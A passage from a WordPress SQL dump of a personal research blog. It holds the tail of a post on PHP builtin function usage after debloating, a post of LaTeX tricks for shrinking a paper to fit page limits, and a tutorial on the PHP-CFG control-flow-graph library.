=\"width: 11.2069%; height: 23px;\"><strong>phpMyAdmin</strong></td>\n<td style=\"width: 5.73967%; height: 23px;\">76</td>\n<td style=\"width: 6.4982%; height: 23px;\">0 <span style=\"color: #008000;\">(100%▼)</span></td>\n<td style=\"width: 20.8656%; height: 23px;\">976</td>\n<td style=\"width: 5.9774%; height: 23px;\">242 <span style=\"color: #008000;\">(75%▼)</span></td>\n<td style=\"width: 16.0916%; height: 23px;\">970</td>\n<td style=\"width: 1.63132%; height: 23px;\">182 <span style=\"color: #008000;\">(81%▼)</span></td>\n<td style=\"width: 5.37974%; height: 23px;\">133</td>\n<td style=\"width: 11.2583%; height: 23px;\">16 <span style=\"color: #008000;\">(88%▼)</span></td>\n<td style=\"width: 6.45367%; height: 23px;\">1304</td>\n<td style=\"width: 3.08092%; height: 23px;\">253 <span style=\"color: #008000;\">(81%▼)</span></td>\n<td style=\"width: 12.1496%; height: 23px;\">892</td>\n<td style=\"width: 16.3348%; height: 23px;\">314 <span style=\"color: #008000;\">(65%▼)</span></td>\n</tr>\n</tbody>\n</table>\n<p> </p>\n<p>Overall, debloating proves to be successful in removing the majority of security sensitive builtin PHP functions. I have also uploaded the number of calls to each builtin function to the Github repo under results directory.</p>\n<p>Finally, if you are planning to emulate PHP builtin functions for the purpose of static PHP code analysis, you know where to start.</p>\n<!-- /wp:tadv/classic-paragraph -->','PHP builtin functions usage statistics','','publish','open','open','','php-builtin-functions-usage-statistics','','','2020-01-31 04:11:05','2020-01-30 23:41:05','',0,'https://www.silverf0x00.com/?p=701',0,'post','',0),(706,1,'2020-01-31 02:52:08','2020-01-30 22:22:08','','builtin_func_calls','','inherit','open','closed','','builtin_func_calls','','','2020-01-31 02:52:08','2020-01-30 22:22:08','',701,'http://localhost:9095/WordPress/wp-content/uploads/2020/01/builtin_func_calls.png',0,'attachment','image/png',0),(726,1,'2020-01-31 03:53:19','2020-01-30 23:23:19','','elephpant','','inherit','open','closed','','elephpant','','','2020-01-31 03:53:19','2020-01-30 23:23:19','',701,'http://localhost:9095/WordPress/wp-content/uploads/2020/01/elephpant.jpeg',0,'attachment','image/jpeg',0),(752,1,'2020-02-09 22:41:05','2020-02-09 18:11:05','','Magic Fox','','inherit','open','closed','','we31fwv__400x400','','','2020-02-09 22:41:05','2020-02-09 18:11:05','',0,'http://localhost:9095/WordPress/wp-content/uploads/2020/02/wE31fwv__400x400.jpg',0,'attachment','image/jpeg',0),(755,1,'2020-02-09 23:08:30','2020-02-09 18:38:30','','minimer','','publish','closed','closed','','minimer','','','2020-02-09 23:08:30','2020-02-09 18:38:30','',0,'https://www.silverf0x00.com/minimer/',0,'custom_css','',0),(786,1,'2020-02-09 16:45:20','2020-02-09 21:45:20','','Resume','','publish','closed','closed','','resume','','','2020-02-09 16:45:20','2020-02-09 21:45:20','',0,'https://www.silverf0x00.com/?page_id=786',0,'page','',0),(788,1,'2020-02-09 16:18:02','2020-02-09 21:18:02','','me_owasp','','inherit','open','closed','','me_owasp','','','2020-02-09 16:18:02','2020-02-09 21:18:02','',0,'http://localhost:9095/WordPress/wp-content/uploads/2020/02/me_owasp.jpg',0,'attachment','image/jpeg',0),(801,1,'2020-02-15 23:04:34','2020-02-16 04:04:34','<!-- wp:tadv/classic-paragraph -->\n<p>As PhD students or grant writers, I\'m sure we have all been there. You need to squeeze in two more paragraphs into the text and stay under the 12 page limits. Sometimes you can throw away another paragraph that is not so necessary. Other times you can rephrase multiple sentences and save several lines. Shrinking figures is always an option.</p>\n<p>You know what\'s worse? Resubmitting a paper to a conference with a less forgiving template in terms of space, or just a smaller page limit. Once the idea is shaped and the text is written, it is indeed harder to go back and shrink it further. After fitting a 30 page paper in 20 pages, I thought I\'m qualified to share the tips I learned. In this post, I\'m going to share several well-known and less-known systematic techniques to squeeze in that extra paragraph, or sometimes half a page &#x1f605;, into the paper.</p>\n<p><strong>Quick reference:</strong></p>\n<ul>\n<li><a href=\"#focus_on_para\">Focus on paragraphs where one or two words fall on to the next line</a></li>\n<li><a href=\"#remove_text\">Shrink background or the related work</a></li>\n<li><a href=\"#savereferences\">Save space from the references</a></li>\n<li><a href=\"#savetrees\">SaveTrees package</a></li>\n<li><a href=\"#negative_vspace\">Negative vspace</a></li>\n<li><a href=\"#fake_itemize\">Itemize with fake bullets</a></li>\n<li><a href=\"#section_spacing\">Section and Subsection spacing</a></li>\n<li><a href=\"#font_size\">Reducing the font-size !! caution !!</a></li>\n</ul>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:tadv/classic-paragraph -->\n<h2>Text Manipulation Techniques</h2>\n<p>This is the organic way of shrinking a paper. Essentially, we are looking for any type of redundancy. Are you repeating yourself? Can you remove certain words without changing the sentences too much? For example \"This method is very useful in ...\" can be rewritten as \"This method is useful in ...\". Most of these opportunities to rewrite and shrink the text should come to you naturally.</p>\n<p><strong><a id=\"focus_on_para\"></a>Focus on paragraphs where one or two words fall on to the next line:</strong>  Shrinking text specifically from these paragraphs will pay good dividend in terms of saving space.</p>\n<p><strong><a id=\"remove_text\"></a>Shrink background or the related work: </strong>In an ideal world, every word in the paper conveys something so you don\'t want to remove anything. But when it comes down to this, specific parts are of less importance. As the last ditch effort, one can remove a sentence from the related work or the background.</p>\n<p><strong><a id=\"savereferences\"></a>Save space from the references/bibliography:</strong> The page limit for some venues does not include the references and the appendices. Sometimes there is a hard limit for everything, and at times, the references are included in the original page limit. If the latter is the case, you can save some space by removing duplicate items (e.g., IEEE S&amp;P 2020 (2020) with duplicate years), and by removing unnecessary fields such as:</p>\n<ul>\n<li>doi URLs</li>\n<li>Page numbers</li>\n<li>Conference location</li>\n<li>Month</li>\n<li>ISBN</li>\n<li>Issue number</li>\n<li>Article URL</li>\n</ul>\n<p>If the conference/journal has a widely known abbreviation, it can be used. You need to keep the authors, title and the venue and publish year, the rest can go.</p>\n<!-- /wp:tadv/classic-paragraph -->\n\n<!-- wp:tadv/classic-paragraph -->\n<h2>Packages &amp; Techniques (+Black magic &#x1f608;)</h2>\n<p><strong><a id=\"savetrees\"></a>SaveTrees:</strong> This <a href=\"https://ctan.org/pkg/savetrees?lang=en\">LaTeX Package</a> will reduce the line height and will try to subtly save you some space. To put this into perspective, an 18 page paper with Usenix Security conference template will become 19 pages without the savetrees package. It is saving 1 full page in 19 pages.</p>\n<p>You\'d want to use it in \"subtle\" mode. In the example below, it is saving us two lines out of two paragraphs.</p>\n<pre class=\"theme:classic lang:tex decode:true\">\\usepackage[subtle]{savetrees}\n...\n\\begin{document}</pre>\n<p><a href=\"http://localhost:9095/WordPress/wp-content/uploads/2020/02/Screen-Shot-2020-02-15-at-11.57.35-PM.png\"><img class=\"aligncenter size-full wp-image-860\" src=\"http://localhost:9095/WordPress/wp-content/uploads/2020/02/Screen-Shot-2020-02-15-at-11.57.35-PM.png\" alt=\"\" width=\"685\" height=\"446\"></a></p>\n<p><strong><a id=\"negative_vspace\"></a>Negative vspace:&nbsp;</strong>The padding before and after figures and tables is sometimes unnecessarily large. By adding negative vspace to figures and tables, this space can be reclaimed.</p>\n<pre class=\"theme:classic lang:tex decode:true\">\\begin{figure}\n\\vspace{-2ex}\n\\includegraphics[width=\\textwidth]{fig1.eps}\n\\caption{A figure caption is always placed below the illustration.\nPlease note that short captions are centered, while long ones are\njustified by the macro package automatically.} \\label{fig1}\n\\vspace{-5ex}\n\\end{figure}</pre>\n<p><a href=\"http://localhost:9095/WordPress/wp-content/uploads/2020/02/Screen-Shot-2020-02-15-at-10.31.59-PM.png\"><img class=\"aligncenter size-full wp-image-815\" src=\"http://localhost:9095/WordPress/wp-content/uploads/2020/02/Screen-Shot-2020-02-15-at-10.31.59-PM.png\" alt=\"\" width=\"1000\" height=\"396\"></a></p>\n<p><strong><a id=\"fake_itemize\"></a>Itemize with fake bullets:&nbsp;</strong>Another opportunity to save space is from the indentation of bullet lists. Itemize can be faked with $\\bullet$:</p>\n<pre class=\"theme:classic lang:tex decode:true\">\\begin{itemize}\n    \\item \\textbf{item 1} abc.\n    \\item \\textbf{item 2} abc.\n    \\item \\textbf{item 3} abc.\n\\end{itemize}\n% Replace with\n\\vspace{0.5ex}\n\\noindent $\\bullet$ \\textbf{item 1} abc.\n\\vspace{0.5ex}\n\\noindent $\\bullet$ \\textbf{item 2} abc.\n\\vspace{0.5ex}\n\\noindent $\\bullet$ \\textbf{item 3} abc.\n\\vspace{0.5ex}</pre>\n<p>Which looks like this:</p>\n<p><a href=\"http://localhost:9095/WordPress/wp-content/uploads/2020/02/Screen-Shot-2020-02-15-at-11.01.10-PM.png\"><img class=\"aligncenter size-full wp-image-824\" src=\"http://localhost:9095/WordPress/wp-content/uploads/2020/02/Screen-Shot-2020-02-15-at-11.01.10-PM.png\" alt=\"\" width=\"697\" height=\"273\"></a></p>\n<p><strong><a id=\"section_spacing\"></a>Section and Subsection spacing:&nbsp;</strong>You can <a href=\"https://tex.stackexchange.com/a/53341/161767\">reduce the spacing before and after section headers</a>. To do that, use the <a href=\"https://ctan.org/pkg/titlesec?lang=en\">titlesec package</a> along with the following code:</p>\n<pre class=\"theme:classic lang:tex decode:true\">\\usepackage{titlesec}\n\\titlespacing\\section{0pt}{12pt plus 4pt minus 2pt}{0pt plus 2pt minus 2pt}\n\\titlespacing\\subsection{0pt}{12pt plus 4pt minus 2pt}{0pt plus 2pt minus 2pt}\n\\titlespacing\\subsubsection{0pt}{12pt plus 4pt minus 2pt}{0pt plus 2pt minus 2pt}\n...\n\\begin{document}</pre>\n<p>In our sample template, this gives us two extra lines in each column.</p>\n<p><a href=\"http://localhost:9095/WordPress/wp-content/uploads/2020/02/Screen-Shot-2020-02-15-at-11.21.41-PM.png\"><img class=\"aligncenter size-full wp-image-825\" src=\"http://localhost:9095/WordPress/wp-content/uploads/2020/02/Screen-Shot-2020-02-15-at-11.21.41-PM.png\" alt=\"\" width=\"694\" height=\"651\"></a></p>\n<p>For lncs templates, you would need to use the following code:</p>\n<div>\n<pre class=\"theme:classic lang:tex decode:true \">% Reduce section spacing\n\\makeatletter\n\\renewcommand\\section{\\@startsection{section}{1}{\\z@}%\n                       {-8\\p@ \\@plus -4\\p@ \\@minus -4\\p@}%\n                       {6\\p@ \\@plus 4\\p@ \\@minus 4\\p@}%\n                       {\\normalfont\\large\\bfseries\\boldmath\n                        \\rightskip=\\z@ \\@plus 8em\\pretolerance=10000 }}\n\\renewcommand\\subsection{\\@startsection{subsection}{2}{\\z@}%\n                       {-8\\p@ \\@plus -4\\p@ \\@minus -4\\p@}%\n                       {6\\p@ \\@plus 4\\p@ \\@minus 4\\p@}%\n                       {\\normalfont\\normalsize\\bfseries\\boldmath\n                        \\rightskip=\\z@ \\@plus 8em\\pretolerance=10000 }}\n\\renewcommand\\subsubsection{\\@startsection{subsubsection}{3}{\\z@}%\n                       {-4\\p@ \\@plus -4\\p@ \\@minus -4\\p@}%\n                       {-1.5em \\@plus -0.22em \\@minus -0.1em}%\n                       {\\normalfont\\normalsize\\bfseries\\boldmath}}\n\\makeatother\n...\n\\begin{document}</pre>\n<p><strong><a id=\"font_size\"></a>Reducing the font-size !! caution !!</strong> is also another possibility. This is risky though, from what I\'ve read online, reducing the size of the table text, and the references are safe. But reducing the size of the main text is something you should refrain from. <a href=\"https://www.overleaf.com/learn/latex/Font_sizes,_families,_and_styles\">Read more about reducing the font-size...</a></p>\n<p>Do you know about a technique that was not mentioned here? Comment below and I\'ll add it to the text.</p>\n</div>\n<!-- /wp:tadv/classic-paragraph -->','Shrinking a LaTeX paper to fit under the page limits','','publish','open','open','','shrinking-a-latex-paper-to-fit-under-the-page-limits','','','2020-02-15 23:04:34','2020-02-16 04:04:34','',0,'https://www.silverf0x00.com/?p=801',0,'post','',0),(815,1,'2020-02-15 22:36:20','2020-02-16 03:36:20','','Negative vspace sample','','inherit','open','closed','','screen-shot-2020-02-15-at-10-31-59-pm','','','2020-02-15 22:36:20','2020-02-16 03:36:20','',801,'http://localhost:9095/WordPress/wp-content/uploads/2020/02/Screen-Shot-2020-02-15-at-10.31.59-PM.png',0,'attachment','image/png',0),(824,1,'2020-02-15 23:13:29','2020-02-16 04:13:29','','fake bullets','','inherit','open','closed','','screen-shot-2020-02-15-at-11-01-10-pm','','','2020-02-15 23:13:29','2020-02-16 04:13:29','',801,'http://localhost:9095/WordPress/wp-content/uploads/2020/02/Screen-Shot-2020-02-15-at-11.01.10-PM.png',0,'attachment','image/png',0),(825,1,'2020-02-15 23:23:56','2020-02-16 04:23:56','','section spacing','','inherit','open','closed','','screen-shot-2020-02-15-at-11-21-41-pm','','','2020-02-15 23:23:56','2020-02-16 04:23:56','',801,'http://localhost:9095/WordPress/wp-content/uploads/2020/02/Screen-Shot-2020-02-15-at-11.21.41-PM.png',0,'attachment','image/png',0),(860,1,'2020-02-15 23:58:48','2020-02-16 04:58:48','','Save Trees','','inherit','open','closed','','screen-shot-2020-02-15-at-11-57-35-pm','','','2020-02-15 23:58:48','2020-02-16 04:58:48','',801,'http://localhost:9095/WordPress/wp-content/uploads/2020/02/Screen-Shot-2020-02-15-at-11.57.35-PM.png',0,'attachment','image/png',0),(912,1,'2020-02-26 14:46:17','2020-02-26 19:46:17','<!-- wp:paragraph -->\n<p><a href=\"https://github.com/ircmaxell/php-cfg\">PHP-CFG</a> is PHP project developed by Anthony Ferrara. It uses <a href=\"https://github.com/nikic/PHP-Parser\">PHP-Parser</a> to generate the <a href=\"https://en.wikipedia.org/wiki/Abstract_syntax_tree\">AST</a> from the PHP code. Then transforms this into another intermediate representation in the form of a <a href=\"https://en.wikipedia.org/wiki/Control-flow_graph\">control flow graph</a>. This enables us an easy way to traverse this graph and reason about the execution of the underlying PHP code.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:luckywp/tableofcontents /-->\n\n<!-- wp:heading -->\n<h2>Getting started</h2>\n<!-- /wp:heading -->\n\n<!-- wp:paragraph -->\n<p>To get started, you\'d need to know some basic compiler concepts. The audience of this post are people from a variety of backgrounds so I\'ll try to cover as much as possible. If some concepts don\'t make sense through out the text, it is likely that you need to learn more about compiler design concepts. Hopefully I have given you enough clue to know what to look for.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:heading {\"level\":3} -->\n<h3><strong>How does the PHP engine run a PHP script?</strong></h3>\n<!-- /wp:heading -->\n\n<!-- wp:paragraph -->\n<p>PHP code runs inside the Zend engine. This means that, to run a PHP script, a compiler will parse and transform the PHP code into an intermediate representation (IR) for the PHP Zend engine (a Virtual Machine) to execute.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>For a very simple PHP code, you can see the IR here:</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:enlighter/codeblock {\"language\":\"php\",\"theme\":\"git\"} -->\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\" data-enlighter-theme=\"git\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">&lt;?php\n\n$a = 1; \n$b = 2; \n$c = $a + $b;\n-----\nnumber of ops:  5\ncompiled vars:  !0 = $a, !1 = $b, !2 = $c\nline     #* E I O op                           fetch          ext  return  operands\n-------------------------------------------------------------------------------------\n   3     0  E >   ASSIGN                                                   !0, 1\n   4     1        ASSIGN                                                   !1, 2\n   5     2        ADD                                              ~5      !0, !1\n         3        ASSIGN                                                   !2, ~5\n   6     4      > RETURN                                                   1</pre>\n<!-- /wp:enlighter/codeblock -->\n\n<!-- wp:paragraph -->\n<p>On top, you see a simple PHP code. On the bottom, the IR equivalent is printed. You can see that !0, !1 and !2 are compiler variables that represent $a, $b and $c accordingly. On line 13, 1 is assigned to !0 ($a) and on line 15, !0 ($a) and !1 ($b) are added together and ~5 (a temporary variable) is returned which is then stored in !2 ($c).</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>The PHP binary, either called through the command line or by the web server first generates this IR and then executes it. The PHP itself is written in C.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:heading {\"level\":3} -->\n<h3>What is an Abstract Syntax Tree (AST)?</h3>\n<!-- /wp:heading -->\n\n<!-- wp:paragraph -->\n<p>In order to understand the source code, a compiler parses and transforms the language structs into a tree structure.&nbsp; In the example below, 2, 7 and 3 (or their respective variables) are identifiers and * and + are expressions.&nbsp; By traversing the tree, the compiler is able to generate the IR in the example of PHP. <a href=\"https://github.com/nikic/PHP-Parser\">PHP-Parser</a> is a PHP package that does just that. It is able to generate the AST for the given PHP code.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:image {\"align\":\"center\",\"id\":916,\"width\":432,\"height\":236,\"sizeSlug\":\"large\"} -->\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large is-resized\"><img src=\"http://localhost:9095/WordPress/wp-content/uploads/2020/02/lsbasi_part7_ast_01.png\" alt=\"\" class=\"wp-image-916\" width=\"432\" height=\"236\"/></figure></div>\n<!-- /wp:image -->\n\n<!-- wp:heading {\"level\":3} -->\n<h3>What is the Control Flow Graph (CFG)?</h3>\n<!-- /wp:heading -->\n\n<!-- wp:paragraph -->\n<p>The AST includes all the information about the program syntax. But, it lacks information about the flow of the program, which instruction is executed before which one and how the conditions affect the program execution. In a <a href=\"https://www.geeksforgeeks.org/software-engineering-control-flow-graph-cfg/\">CFG</a>, we have this information. Below, is the representation of an if-else block of code. The nodes within the CFG are the <a href=\"https://www.geeksforgeeks.org/basic-blocks-in-compiler-design/\">Basic Blocks</a> of the program.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:image {\"align\":\"center\",\"id\":918,\"width\":287,\"height\":274,\"sizeSlug\":\"large\"} -->\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large is-resized\"><img src=\"http://localhost:9095/WordPress/wp-content/uploads/2020/02/1111-3.jpg\" alt=\"\" class=\"wp-image-918\" width=\"287\" height=\"274\"/></figure></div>\n<!-- /wp:image -->\n\n<!-- wp:paragraph -->\n<p>Basic blocks are the consecutive program instructions that will always execute if we enter the block. That is, they do not have any branches in between. In the example below, $a = 2 and $b = 4 would form a basic block because they will always get executed consecutively.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:enlighter/codeblock {\"language\":\"php\"} -->\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">&lt;?php\nif ($a > 1) { \n    $a = 2; \n    $b = 4; \n} \nelse { \n    ... \n}</pre>\n<!-- /wp:enlighter/codeblock -->\n\n<!-- wp:paragraph -->\n<p>We plan to use PHP-CFG to generate this graph and traverse it to analyze the source code.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:heading -->\n<h2>Running the PHP-CFG Project</h2>\n<!-- /wp:heading -->\n\n<!-- wp:paragraph -->\n<p>Now that we now the basics, or at least know, what to look for to learn the basic stuff, it\'s time to start playing with the PHP-CFG project.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>You can find my fork of this project <a href=\"https://github.com/silverfoxy/php-cfg\">here</a>. I have made some slight modifications to make it fit my needs, like adding symbolic variable nodes. For the purpose of this blog post, it shouldn\'t matter which fork you look at.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:heading {\"level\":4} -->\n<h4><strong>1. Clone project and install PHP 7.4</strong></h4>\n<!-- /wp:heading -->\n\n<!-- wp:paragraph -->\n<p>First of all, clone and run the demo.php file to see how it works. You need PHP 7.4 to run this project. Luckily PHP 7.4 is not in beta anymore so you should be able to grab it using your system\'s package manager.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:heading {\"level\":4} -->\n<h4><strong>2. Install composer packages</strong></h4>\n<!-- /wp:heading -->\n\n<!-- wp:paragraph -->\n<p>PHP-CFG, like most mature PHP projects, relies on external dependencies such as PHP-Parser. To fetch these, you need to use composer. <a href=\"https://getcomposer.org/download/\">Get composer from here</a>. Then install the packages via composer by running the following command from within the PHP-CFG directory.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:enlighter/codeblock {\"language\":\"shell\"} -->\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"shell\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">php composer.phar install</pre>\n<!-- /wp:enlighter/codeblock -->\n\n<!-- wp:heading {\"level\":4} -->\n<h4><strong>3. Run The demo.php</strong></h4>\n<!-- /wp:heading -->\n\n<!-- wp:paragraph -->\n<p>Let\'s create a sample PHP file. Call it test.php:</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:enlighter/codeblock {\"language\":\"php\"} -->\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">&lt;?php\n$a = 2; \nif ($a > 1) { \n    echo \"$a > 1\"; \n} \nelse { \n    echo \"$a &lt;= 1\"; \n}</pre>\n<!-- /wp:enlighter/codeblock -->\n\n<!-- wp:paragraph -->\n<p>Now, run demo.php on this file. This will output the control flow graph in <a href=\"https://en.wikipedia.org/wiki/DOT_(graph_description_language)\">DOT</a> format. We will then use <a href=\"https://zoomadmin.com/HowToInstall/UbuntuPackage/xdot\">xdot</a> to visualize this file.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:enlighter/codeblock {\"language\":\"shell\"} -->\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"shell\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">php demo.php test.php > graph.dot\nxdot graph.dot</pre>\n<!-- /wp:enlighter/codeblock -->\n\n<!-- wp:paragraph -->\n<p>The CFG for the code above looks like this:</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:image {\"align\":\"center\",\"id\":930,\"width\":334,\"height\":392,\"sizeSlug\":\"large\"} -->\n<div class=\"wp-block-image\"><figure class=\"aligncenter size-large is-resized\"><img src=\"http://localhost:9095/WordPress/wp-content/uploads/2020/02/Screen-Shot-2020-02-24-at-12.24.30-PM-872x1024.png\" alt=\"\" class=\"wp-image-930\" width=\"334\" height=\"392\"/></figure></div>\n<!-- /wp:image -->\n\n<!-- wp:paragraph -->\n<p>Note that we are using a fork of PHP-CFG. This fork includes some extra code to handle constructs such as \"try catches\". It also includes extra information such as the block coverage (i.e., red block is uncovered and green would be covered block) and symbolic nodes. Ignore the block colors for now.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>Starting from the very top block in the graph, every PHP file will start with a fake \"main()\" function as the entry point. The next line is the path to the source script for that block (…/tmp/php-cfg/demo.php). This line would point to the included file when resolving includes (We will deal with this in the future as its not part of the PHP-CFG itself). Then we can see the opcodes being listed in the first block which assigns 2 to $a. Then we branch to if/else blocks and finally return from the script.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>PHP-CFG is also able to produce text based output instead of dot format. This option can be enabled by changing $graphviz to false in <a href=\"https://github.com/silverfoxy/php-cfg/blob/580fc9ba2425590eea32db9d7a4c4cf1a9e988b8/demo.php#L16\">Line 16 of demo.php</a> file.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:heading {\"level\":4} -->\n<h4>4. <strong>Using PHP-CFG in other projects</strong></h4>\n<!-- /wp:heading -->\n\n<!-- wp:paragraph -->\n<p>For this step, we will pretty much use the same APIs used within demo.php file. First, create a parser instance, this is using PHP-Parser to generate the AST and then the PHP-CFG parser to generate the IR used in the CFG. Within the PHP-Parser, you can set the preferred syntax to PHP 5 or PHP 7 based on the PHP version that the target code under analysis is written in.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>Several visitors are defined by default. DeclarationFinder, CallFinder and VariableFinder. We will see what they do later. For now, it is sufficient to know that each Visitor will hook calls on specific events throughout the parsing process. For example, we can run our code in a visitor each time a new Opcode is generated, or a new basic block is generated. These visitors either extract some high level information from the code or modify the output of the code on the fly. We add our visitors to the traverser object using addVisitor() and call parse(). This will return an array which inlcudes the CFG in its proprietary IR format. Again, the <a href=\"https://github.com/silverfoxy/php-cfg/blob/master/demo.php\">demo.php</a> file can be used as a reference here.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:heading -->\n<h2><strong>Project structure</strong></h2>\n<!-- /wp:heading -->\n\n<!-- wp:paragraph -->\n<p>Looking at <a href=\"https://github.com/silverfoxy/php-cfg\">the repository</a>, we see the following structure:</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:heading {\"level\":4} -->\n<h4><strong>lib/PHPCfg</strong></h4>\n<!-- /wp:heading -->\n\n<!-- wp:paragraph -->\n<p>Hosts the main files of the project.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:heading {\"level\":4} -->\n<h4>test</h4>\n<!-- /wp:heading -->\n\n<!-- wp:paragraph -->\n<p>Unit tests of this project reside in this directory. Each unit test consists of a PHP file inside test\\code directory in the following format. The actual unit tests are executed from PHPCfg directory by iterating over all samples in code directory. The code above the dashes is executed and the result is compared with the text below the dashes. As far as we are concerned, we can add new unit tests to test\\code directory without having to worry about the rest.<br></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>PHP Code<br>----- (5 dashes)<br>Expected result</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:enlighter/codeblock {\"language\":\"php\"} -->\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">&lt;?php\n\nif ($a) {\n    echo \"a\";\n} else {\n    echo \"b\";\n}\necho \"c\";\n-----\nBlock#1\n    Stmt_JumpIf\n        cond: Var#1&lt;$a>\n        if: Block#2\n        else: Block#3\n\nBlock#2\n    Parent: Block#1\n    Terminal_Echo\n        expr: LITERAL(\'a\')\n    Stmt_Jump\n        target: Block#4\n\nBlock#3\n    Parent: Block#1\n    Terminal_Echo\n        expr: LITERAL(\'b\')\n    Stmt_Jump\n        target: Block#4\n\nBlock#4\n    Parent: Block#2\n    Parent: Block#3\n    Terminal_Echo\n        expr: LITERAL(\'c\')\n    Terminal_Return</pre>\n<!-- /wp:enlighter/codeblock -->\n\n<!-- wp:heading {\"level\":4} -->\n<h4>Parser</h4>\n<!-- /wp:heading -->\n\n<!-- wp:paragraph -->\n<p>This is the heart of PHP-CFG. It resides in \\lib\\PHPCfg\\Parser.php. It\'s a giant class with functions that can handle different types of IR opcodes. </p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p><em>[ parse($code, $fileName, $main_function_name = \'{main}\'): <a href=\"https://github.com/silverfoxy/php-cfg/blob/b251f57fa54ddb408e104049f1e4dcd89ae3d94a/lib/PHPCfg/Parser.php#L105\">105</a> ]</em><br>On line <a href=\"https://github.com/silverfoxy/php-cfg/blob/b251f57fa54ddb408e104049f1e4dcd89ae3d94a/lib/PHPCfg/Parser.php#L105\">105</a>, parse() function is called which takes as input the source code, calls $astParser on it, which is PhpParser\\Parser, and retrieves the AST.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p><em>[ parseAst($ast, $fileName, $main_function_name): Script: <a href=\"https://github.com/silverfoxy/php-cfg/blob/b251f57fa54ddb408e104049f1e4dcd89ae3d94a/lib/PHPCfg/Parser.php#L114\">114</a> ]</em><br>The AST is then passed to parseAst function. It will start by creating the {main} function as the entry point to the CFG and will iterate through the AST nodes to generate the graph.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p><em>[ parseFunc(Func $func, array $params, array $stmts): <a href=\"https://github.com/silverfoxy/php-cfg/blob/b251f57fa54ddb408e104049f1e4dcd89ae3d94a/lib/PHPCfg/Parser.php#L145\">145</a> ]</em><br>Next, parseFunc is called on the main entry point of the program. It will generate a new block and start parsing nodes.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p><em>[ parseNode(Node $node): <a href=\"https://github.com/silverfoxy/php-cfg/blob/b251f57fa54ddb408e104049f1e4dcd89ae3d94a/lib/PHPCfg/Parser.php#L188\">188</a> ]</em><br>ParseNode is rather straightforward. It takes a node, checks if the type of the node is an expression, if it is, it passes the node to parseExprNode. If the node is not an expression, it tries to parse it by calling the function named after the type of the node. For example, parseStmt_Class will parse Stmt_Class node (Which represents a class definition).</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>I\'ll stop here for the parser. You can follow the rest of the flow throughout the code if you like. The code is pretty much self explanatory if you know what you\'re looking for. An understanding of the parser is beneficial to take a good grasp of the whole CFG generation and also slight modifications of the code if necessary. Like adding a new type of block (Try, Catch blocks) or adding Block identifiers to the structure.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:heading {\"level\":4} -->\n<h4>Opcodes</h4>\n<!-- /wp:heading -->\n\n<!-- wp:paragraph -->\n<p>Opcodes are the IR instructions in our language. They usually perform an operation on multiple operands and sometimes return a result or change the state of the program. I will try to document them on a separate page. They can be found under lib\\PHPCfg\\Op directory.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:heading {\"level\":4} -->\n<h4>Operands</h4>\n<!-- /wp:heading -->\n\n<!-- wp:paragraph -->\n<p>These are either inputs to the Ops or produced by them. List of available operands is under lib\\PHPCfg\\Operand.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:list 